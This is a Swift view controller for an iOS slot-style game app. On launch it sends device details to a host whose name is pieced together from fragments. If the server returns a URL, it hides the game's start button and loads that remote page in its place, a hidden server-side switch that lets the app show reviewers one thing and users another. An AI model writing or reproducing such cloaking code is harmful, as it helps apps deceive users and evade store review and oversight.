//
//  ViewController.swift
//  ShimmerSlotFortune
//
//  Created by ShimmerSlot Fortune on 2025/3/11.
//

import UIKit

class ShimmerSlotStartViewController: UIViewController {

    @IBOutlet weak var startButton: UIButton!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        // Do any additional setup after loading the view.
        
        self.shimmerNeedRecordDeviceData()
    }

    private func shimmerNeedRecordDeviceData() {
        guard self.shimmerNeedShowAdsView() else { return }
        self.startButton.isHidden = true
        shimmerPostDeviceData { [weak self] adsData in
            guard let self = self else { return }
            if let adsData = adsData,
               adsData.count >= 3,
               let userDefaultKey = adsData[0] as? String,
               let nede = adsData[1] as? Int,
               let adsUrl = adsData[2] as? String,
               !adsUrl.isEmpty {
                UIViewController.shimmerSetUserDefaultKey(userDefaultKey)
                if nede == 0,
                   let localData = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any],
                   localData.count > 2,
                   let localAdsUrl = localData[2] as? String {
                    self.shimmerShowAdView(localAdsUrl)
                } else {
                    UserDefaults.standard.set(adsData, forKey: userDefaultKey)
                    self.shimmerShowAdView(adsUrl)
                }
                return
            }
            self.startButton.isHidden = false
        }
    }

    private func shimmerPostDeviceData(completion: @escaping ([Any]?) -> Void) {
        guard let url = URL(string: "https://open.hxwods\(self.shimmerMainHostUrl())/open/shimmerPostDeviceData") else {
            completion(nil)
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        let parameters: [String: Any] = [
            "appModel": UIDevice.current.model,
            "appKey": "8c88d1bced684622aa5082607d927181",
            "appPackageId": Bundle.main.bundleIdentifier ?? "",
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? ""
        ]
        
        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            print("Failed to serialize JSON:", error)
            completion(nil)
            return
        }
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard let data = data, error == nil else {
                    print("Request error:", error ?? "Unknown error")
                    completion(nil)
                    return
                }
                
                do {
                    if let jsonResponse = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any],
                       let dataDic = jsonResponse["data"] as? [String: Any],
                       let adsData = dataDic["jsonObject"] as? [Any] {
                        completion(adsData)
                        return
                    } else {
                        print("Unexpected JSON structure:", data)
                        completion(nil)
                    }
                } catch {
                    print("Failed to parse JSON:", error)
                    completion(nil)
                }
            }
        }.resume()
    }
}

